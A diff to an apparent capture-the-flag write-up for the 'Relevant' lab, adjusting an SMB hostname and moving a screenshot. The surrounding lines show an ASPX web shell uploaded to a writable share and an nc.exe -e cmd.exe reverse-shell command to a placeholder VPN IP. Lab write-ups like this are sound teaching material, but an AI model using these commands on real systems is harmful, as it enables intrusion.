@@ -121,7 +121,7 @@ cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx
 
 Then I uploaded it to the writable SMB share:
 ```cmd id="dvo4ek"
-smbclient //relevant/nt4wrksv -N
+smbclient //relevant.thm/nt4wrksv -N
 ```
 Inside the SMB session:
 ```cmd id="dvo4ek"
@@ -176,13 +176,12 @@ I started a Netcat listener to catch the reverse shell. I used rlwrap for conven
 ```cmd id="dvo4ek"
 rlwrap -cAr nc -lvnp 4444
 ```
-<img width="955" height="120" alt="image" src="https://github.com/user-attachments/assets/e6202c6e-01b3-4b41-9c2a-04a32754b395" />
-
 Then, from the ASPX web shell, I executed `nc.exe` to connect back to my listener:
 
 ```cmd id="dvo4ek"
 C:\inetpub\wwwroot\nt4wrksv\nc.exe -e cmd.exe <YOUR-VPN-IP> 4444
 ```
+<img width="955" height="120" alt="image" src="https://github.com/user-attachments/assets/e6202c6e-01b3-4b41-9c2a-04a32754b395" />
 <img width="1338" height="358" alt="image" src="https://github.com/user-attachments/assets/4feeed05-6737-4e71-a964-60adad81fb78" />
 
 After running the command, I received a reverse shell on my Kali machine. I confirmed the current user context again:
